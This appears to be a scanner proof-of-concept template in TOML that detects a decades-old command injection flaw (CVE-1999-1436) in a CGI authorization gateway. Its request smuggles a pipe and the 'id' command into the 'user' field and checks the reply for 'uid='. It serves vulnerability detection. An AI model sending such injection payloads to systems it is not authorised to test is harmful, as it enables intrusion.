[info]
author = "ave"
description = "通过向 user 参数注入管道符和系统命令检测 CGI 命令注入漏洞，脚本将 user 参数直接拼接至 grep 反引号命令中执行"
id = "POC-AVE-1999-1273"
name = "Ray Chan WWW Authorization Gateway 0.1 Command Injection PoC"
severity = "high"
tags = ["ave-1999-1273"]
vuln_id = [
    "CVE-1999-1436",
    "AVE-1999-1273",
]

[poc]
logic = "any"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/cgi-bin/authorize"
protocol = "http"

[poc.requests.body]
content = "user=%7Cid&password=test"
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["uid="]
